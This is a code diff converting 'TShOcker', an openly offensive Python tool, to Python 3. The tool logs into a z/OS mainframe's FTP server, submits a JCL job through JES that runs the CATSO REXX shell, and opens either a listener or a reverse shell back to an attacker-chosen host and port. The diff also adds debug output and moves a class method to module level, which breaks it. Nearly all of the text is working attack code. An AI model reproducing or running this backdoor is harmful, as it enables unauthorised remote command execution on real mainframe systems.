@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 #########################################################################
-#			       TShOcker                                 #
+#                  TShOcker                                 #
 #########################################################################
 # IBM Mainframe Listener or Reverse Shell:                              #
 #   This program is really only a shell around CATSO (see function      #
@@ -9,17 +9,17 @@
 #       #1 - Copy catso to a temp file                                  #
 #       #2 - Execute catso with some parameters                         #
 #                                                                       #
-# Mainframe Backdoor Script:						#
+# Mainframe Backdoor Script:                        #
 #  On z/OS users can submit jobs (or JCL) via FTP (using site file=JES) #
 #  jobs can also execute programs. For example a REXX script This       #
 #  script uploads a JCL file with a REXX script in line which the       #
 #  mainframe executes for us.                                           # 
 #                                                                       #
 # Requirements: Python, z/OS FTP Server username/password and the right #
-#               access rights.						#
-# Created by: Soldier of Fortran (@mainframed767)               	#
-#                                                               	#
-# Copyright GPL 2013                                             	#
+#               access rights.                      #
+# Created by: Soldier of Fortran (@mainframed767)                   #
+#                                                                   #
+# Copyright GPL 2013                                                #
 #########################################################################
 
 from ftplib import FTP #For FTP stuff
@@ -31,10 +31,11 @@ import sys #to sleep and exit
 import signal
 import argparse 
 import base64
+from traceback import print_exc
 
 # This function generates a random filename for us to use
 def filename_generator(size=8, chars=string.ascii_uppercase):
-	return ''.join(random.choice(chars) for x in range( 1, size ))
+    return ''.join(random.choice(chars) for x in range( 1, size ))
 
 ##Colours for us to use
 class bcolors:
@@ -46,25 +47,25 @@ class bcolors:
     ENDC = '\033[0m'
     WHITE = '\033[97m'
 
-    def disable(self):
-        self.HEADER = ''
-        self.BLUE = ''
-        self.GREEN = ''
-        self.YELLOW = ''
-        self.RED = ''
-        self.ENDC = ''
-	self.WHITE = ''
+def disable(self):
+    self.HEADER = ''
+    self.BLUE = ''
+    self.GREEN = ''
+    self.YELLOW = ''
+    self.RED = ''
+    self.ENDC = ''
+    self.WHITE = ''
 
 # catch the ctrl-c to exit and say something instead of Punt!
 def signal_handler(signal, frame):
-        print 'Kick!'+bcolors.ENDC
+        print('Kick!'+bcolors.ENDC)
         sys.exit(0)
 
 def JCLHeader(USERID, FILENAME):
 #Generates the JCL Header needed to create a temp file using JCL
-	JOBNAME = USERID.upper() + random.choice(string.ascii_uppercase) 
-        JOBCARD = JOBNAME.ljust(9)
-	JCL = "//"+JOBCARD+" JOB ("+USERID.upper()+'''),'SoF',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
+    JOBNAME = USERID.upper() + random.choice(string.ascii_uppercase) 
+    JOBCARD = JOBNAME.ljust(9)
+    JCL = "//"+JOBCARD+" JOB ("+USERID.upper()+'''),'SoF',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
 //* The next are lines JCL to create a temp dataset (&&OMG) with
 //* a member ('''+FILENAME+'''). The file then looks like &&OMG('''+FILENAME+''').
 //* The end of the REXX file is noted as single line with ## on it
@@ -78,11 +79,11 @@ def JCLHeader(USERID, FILENAME):
 //             DCB=(LRECL=80,BLKSIZE=3120,RECFM=FB,DSORG=PO)
 //SYSUT1    DD DATA,DLM=##'''
 
-	return JCL
+    return JCL
 
 def CATSO():
 #A copy of catso
-	REXX = '''
+    REXX = '''
 /*                           REXX                                    */
 /*  Catso. n. 1. A base fellow; a rogue; a cheat,                    */
 /*               also a z/OS Network TSO 'shell'                     */
@@ -745,16 +746,16 @@ GET_HELP:
        "                    host/ip user pass filename [binary]",
        NEWLINE||NEWLINE
      return help'''
-	return REXX
+    return REXX
 
 def JCLFooter(FILENAME, LorR, ip_address, port):
-	if LorR == 'R': 
-		parm = ip_address+" "+port
-	else:
-		parm = port
-	
-	parameters = FILENAME+" "+LorR+" "+parm
-	JCLF = '''
+    if LorR == 'R': 
+        parm = ip_address+" "+port
+    else:
+        parm = port
+    
+    parameters = FILENAME+" "+LorR+" "+parm
+    JCLF = '''
 ##
 //* Thats the end of the REXX program. Now lets execute it,
 //* the program, IKJEFT01 lets us execute a REXX program
@@ -766,8 +767,9 @@ def JCLFooter(FILENAME, LorR, ip_address, port):
 //SYSTSIN  DD  DUMMY
 //SYSTSPRT DD  SYSOUT=*
 //SYSEXEC  DD  DSN=&&OMG,DISP=(OLD,DELETE,DELETE)'''
-	return JCLF
+    return JCLF
 
+print("Got Here")
 signal.signal(signal.SIGINT, signal_handler)
 ##########################################################
 #Gather the argumers we need
@@ -788,69 +790,34 @@ parser.add_argument('-v','--verbose',help='Verbose mode. More verbosity', defaul
 #parser.add_argument('','',help='',dest='')
 results = parser.parse_args() 
 
-if results.logo and results.lport != "54321": print bcolors.WHITE+'''
-
-                  .-~*~--,.   .-.
-          .-~-. ./OOOOOOOOO\.'OOO`9~~-.
-        .`OOOOOO.OOM.OLSONOOOOO@@OOOOOO\\
-       /OOOO@@@OO@@@OO@@@OOO@@@@@@@@OOOO`.
-       |OO@@@WWWW@@@@OOWWW@WWWW@@@@@@@OOOO).
-     .-'OO@@@@WW@@@W@WWWWWWWWOOWW@@@@@OOOOOO}
-    /OOO@@O@@@@W@@@@@OOWWWWWOOWOO@@@OOO@@@OO|
-   lOOO@@@OO@@@WWWWWWW\OWWWO\WWWOOOOOO@@@O.'
-    \OOO@@@OOO@@@@@@OOW'''+bcolors.YELLOW+"\|||||\\"+bcolors.WHITE+'''WWWW@@@@@@@O'.
-     `,OO@@@OOOOOOOOOOWW'''+bcolors.YELLOW+"\|||||\\"+bcolors.WHITE+'''WWWW@@@@@@OOO)
-      \,O@@@@@OOOOOOWWWWW'''+bcolors.YELLOW+"\|||||\\"+bcolors.WHITE+'''WW@@@@@OOOO.'
-        `~c~8~@@@@WWW@@W'''+bcolors.YELLOW+"\|||||||\\"+bcolors.WHITE+'''WOO|\UO-~'
-             (OWWWWWW@/\W'''+bcolors.YELLOW+"\|||||||\\"+bcolors.WHITE+'''WO)
-               `~-~''     '''+bcolors.YELLOW+"\|||\\"+bcolors.WHITE+'''WW=*'
-                         '''+bcolors.YELLOW+'''__\|||\\
-                         \||||||\\
-                          \||||__\\
-          '''+bcolors.RED+"TS"+bcolors.GREEN+"h"+bcolors.RED+"O"+bcolors.GREEN+"cker"+bcolors.YELLOW+'''         \||\\
-                            \|\\
-                             \|\\
-                              \\\\
-                               \\\\
-                                \\
-                                 \\
-
-
-'''+bcolors.ENDC
-
-
-secret_douchebag_logo = "ICAgICAgICAgICAgIF9fDQogICAgICAgICAgICAvICBcICAgX18NClRTaE9ja2VyICAgfCAgICB8IC8gIFwNCiAgICAgICAgICAgfCAgICB8fCAgICB8DQogICBfICAgICAgIHwgICAgfHwgICAgfA0KIC8nIHwgICAgICB8IF8gIHx8IF8gIHwNCnwgICB8ICAgICAgfCAgICB8fCAgICB8DQp8IF8gfCAgICAgIHwgICAgfHwgICAgfA0KfCAgIHwgICAgICB8ICAgIHx8ICAgIHwNCnwgICB8ICAgICAgfCAgXyB8fCBfICB8DQp8IF8gfCAgX18gIHwgICAgfHwgICAgfA0KfCAgIHwgLyAgXCB8ICAgIHx8ICAgIHwNCnwgICB8fCAgICB8fCAgICB8fCAgICB8ICAgICAgIF8tLS0uDQp8ICAgfHwgICAgfHwgICAgfC4gX18gfCAgICAgLi8gICAgIHwNCnwgXy4gfCAtLSB8ICAtLSAgICAgIGB8ICAgIC8gICAgICAvLw0KfCcgICB8ICAgIHwgICAgICAgICAgIHwgICAvYCAgICAgKC8NCnwgICAgfCAgICB8ICAgICAgICAgICB8IC4vICAgICAgIC8NCnwgICAgfC4tLS58ICAgICAgICBfXyB8LyAgICAgICAufA0KfCAgX198ICAgIHwgICAgXywtJyAgICAgICAgICAgIC8NCnwtJyAgIFxfXy8gIF8sJyAgICAgICAgICAgICAgLnwNCnwgICAgICAgXy4tJyAgICAgICAgICAgICAgICAgLw0KfCAgIF8uLScgICAgICAvICAgICAgICAgICAgIHwNCnwgICAgICAgICAgICAvICAgICAgICAgICAgIC8NCnwgICAgICAgICAgIHwgICAgICAgICAgICAgLw0KYCAgICAgICAgICAgfCAgICAgICAgICAgIC8NCiBcICAgICAgICAgIHwgICAgICAgICAgLycNCiAgfCAgICAgICAgICBgICAgICAgICAvDQogICBcICAgICAgICAgICAgICAgIC4nDQogICB8ICAgICAgICAgICAgICAgIHwNCiAgIHwgICAgICAgICAgICAgICAgfA=="
-
-if results.logo and results.lport == "54321":
-	print base64.b64decode(secret_douchebag_logo)	
 
 if len(results.username) > 7: 
-        print bcolors.RED + "[!] Usernames cant be longer than 7 characters" + bcolors.ENDC
+        print(bcolors.RED + "[!] Usernames cant be longer than 7 characters" + bcolors.ENDC)
         sys.exit(-1)
 
 if results.listener:
-	would_you_kindly = 'L'
-	if results.lport == None:
-		print bcolors.BLUE + "[+] No port specified. Listening on port 4444."
-		hostname = ''
-		port = "4444"
-                results.lport = port
-		#print "You must specify a listener port (--lport) with -l"
-		#sys.exit(0)
-	else:
-		hostname = ''
-		port = results.lport
+    would_you_kindly = 'L'
+    if results.lport == None:
+        print(bcolors.BLUE + "[+] No port specified. Listening on port 4444.")
+        hostname = ''
+        port = "4444"
+        results.lport = port
+        #print "You must specify a listener port (--lport) with -l"
+        #sys.exit(0)
+    else:
+        hostname = ''
+        port = results.lport
 elif results.reverse:
-	would_you_kindly = 'R'
-	if results.rport == None or results.rhost == None:
-		print "You must specify both --rport and --rhost with reverse mode [-r]"
-		sys.exit(0)
-	else:
-		hostname = results.rhost
-		port = results.rport
+    would_you_kindly = 'R'
+    if results.rport == None or results.rhost == None:
+        print("You must specify both --rport and --rhost with reverse mode [-r]")
+        sys.exit(0)
+    else:
+        hostname = results.rhost
+        port = results.rport
 elif not results.listener and not results.reverse: 
-	print 'You must specify -l or -r. Quitting'
-	sys.exit(0)
+    print('You must specify -l or -r. Quitting')
+    sys.exit(0)
 
 
 #Assemble the JCL File
@@ -861,62 +828,66 @@ EVIL_JOB += JCLFooter(rand_file, would_you_kindly, hostname, port)
 
 
 if results.dotmatrix:
-	print EVIL_JOB
-	sys.exit(0)
+    print(EVIL_JOB)
+    sys.exit(0)
 
 
 #Connect to the mainframe FTP server
-print bcolors.BLUE + "[+] Connecting to:", results.ip,":",results.port, "" + bcolors.ENDC
+print(bcolors.BLUE + "[+] Connecting to:", results.ip,":",results.port, "" + bcolors.ENDC)
 
 if results.debug:
-	print bcolors.YELLOW + "{!} - Verbose mode enabled"
-	print bcolors.YELLOW + "{!} - Mainframe FTP Server: "+bcolors.GREEN+results.ip
-	print bcolors.YELLOW + "{!} - FTP Server Port: "+bcolors.GREEN+results.port
-	print bcolors.YELLOW + "{!} - FTP Username: "+bcolors.GREEN+results.username
-	print bcolors.YELLOW + "{!} - FTP Password: "+bcolors.GREEN+results.password
-	if results.listener: print bcolors.YELLOW + "{!} - Listener mode to be enabled on port: "+bcolors.GREEN+results.lport
-	elif results.reverse: print bcolors.YELLOW + "{!} - Reverse shell to connect back to: "+bcolors.GREEN+results.rhost+":"+results.rport
-try:	
-	MTP = FTP()
-	MTP.connect(results.ip, results.port)
-	MTP.login(results.username, results.password)
-	if results.debug: print bcolors.YELLOW + "{!} - Connected to:"+bcolors.GREEN+"", results.ip,":",results.port, "" + bcolors.ENDC
-except Exception, e:
-    	print  bcolors.RED + "[ERR] could not connect to ",results.ip,":",results.port,"" + bcolors.ENDC
-	print bcolors.RED + "",e,"" + bcolors.ENDC
-	sys.exit(0)
+    print(bcolors.YELLOW + "{!} - Verbose mode enabled")
+    print(bcolors.YELLOW + "{!} - Mainframe FTP Server: "+bcolors.GREEN+results.ip)
+    print(bcolors.YELLOW + "{!} - FTP Server Port: "+bcolors.GREEN+results.port)
+    print(bcolors.YELLOW + "{!} - FTP Username: "+bcolors.GREEN+results.username)
+    print(bcolors.YELLOW + "{!} - FTP Password: "+bcolors.GREEN+results.password)
+    if results.listener: print(bcolors.YELLOW + "{!} - Listener mode to be enabled on port: "+bcolors.GREEN+results.lport)
+    elif results.reverse: print(bcolors.YELLOW + "{!} - Reverse shell to connect back to: "+bcolors.GREEN+results.rhost+":"+results.rport)
+try:    
+    MTP = FTP()
+    MTP.connect(results.ip, results.port)
+    MTP.login(results.username, results.password)
+    if results.debug: print(bcolors.YELLOW + "{!} - Connected to:"+bcolors.GREEN+"", results.ip,":",results.port, "" + bcolors.ENDC)
+except Exception as e:
+    print(bcolors.RED + "[ERR] could not connect to ",results.ip,":",results.port,"" + bcolors.ENDC)
+    print_exc()
+    print(bcolors.RED + "",e,"" + bcolors.ENDC)
+    sys.exit(0)
 
 TEMP_JCL_FILE = '/tmp/rand.jcl' 
 TEMP_JCL = open(TEMP_JCL_FILE,'w')
 TEMP_JCL.write(EVIL_JOB) 
 TEMP_JCL.close()
 
-print bcolors.BLUE + "[+] Switching to JES mode" 
+print(bcolors.BLUE + "[+] Switching to JES mode" )
 
 try: 
-	MTP.voidcmd( "site file=JES" )
-	print bcolors.BLUE + "[+] Inserting JCL with CATSO in to job queue" 
-except Exception, e:
-    	print  bcolors.RED + "[ERR] Could not switch to JES mode. If \"command not understood\" are you sure this is even a mainframe?" + bcolors.ENDC
-	print bcolors.RED + "",e,"" + bcolors.ENDC
-	sys.exit(0)
+    print(MTP.voidcmd( "site file=JES" ))
+    print(bcolors.BLUE + "[+] Inserting JCL with CATSO in to job queue" )
+except Exception as e:
+    print (bcolors.RED + "[ERR] Could not switch to JES mode. If \"command not understood\" are you sure this is even a mainframe?" + bcolors.ENDC)
+    print(bcolors.RED + "",e,"" + bcolors.ENDC)
+    sys.exit(0)
 
 try:
-	jcl_upload = MTP.storlines( 'STOR %s' % results.username.upper(), open(TEMP_JCL_FILE,'rb')) # upload temp file to JES queue
-	os.remove(TEMP_JCL_FILE) # delete the  tmp file
-except Exception, e:
-	os.remove(TEMP_JCL_FILE) #remove the tmp file
-    	print  bcolors.RED + "[ERR] could not upload JCL file" + bcolors.ENDC
-	print bcolors.RED + "",e,"" + bcolors.ENDC
-	sys.exit(0)
+    #print(MTP.voidcmd("debug 5"))
+    print(MTP.voidcmd("EPSV"))
+    print(MTP.voidcmd("site DEBUG=ALL"))
+    jcl_upload = MTP.storlines( 'STOR %s' % results.username.upper(), open(TEMP_JCL_FILE,'rb')) # upload temp file to JES queue
+    os.remove(TEMP_JCL_FILE) # delete the  tmp file
+except Exception as e:
+    os.remove(TEMP_JCL_FILE) #remove the tmp file
+    print(bcolors.RED + "[ERR] could not upload JCL file" + bcolors.ENDC)
+    print(bcolors.RED + "",e,"" + bcolors.ENDC)
+    sys.exit(0)
 
 if results.debug: 
-	print bcolors.YELLOW + "{!} - JCL Upload Messages:\n#########\n", jcl_upload , "\n#########"  + bcolors.ENDC
+    print(bcolors.YELLOW + "{!} - JCL Upload Messages:\n#########\n", jcl_upload , "\n#########"  + bcolors.ENDC)
 
 
 if results.debug:
-	if results.listener: print bcolors.YELLOW + "{!} - Try connecting to : "+bcolors.GREEN+results.ip+":"+results.lport
-	elif results.reverse: print bcolors.YELLOW + "{!} - Reverse shell connects back to: "+bcolors.GREEN+results.rhost+":"+results.rport
-	
-print bcolors.BLUE + "[+] Done..." + bcolors.ENDC
+    if results.listener: print(bcolors.YELLOW + "{!} - Try connecting to : "+bcolors.GREEN+results.ip+":"+results.lport)
+    elif results.reverse: print(bcolors.YELLOW + "{!} - Reverse shell connects back to: "+bcolors.GREEN+results.rhost+":"+results.rport)
+    
+print(bcolors.BLUE + "[+] Done..." + bcolors.ENDC)
 
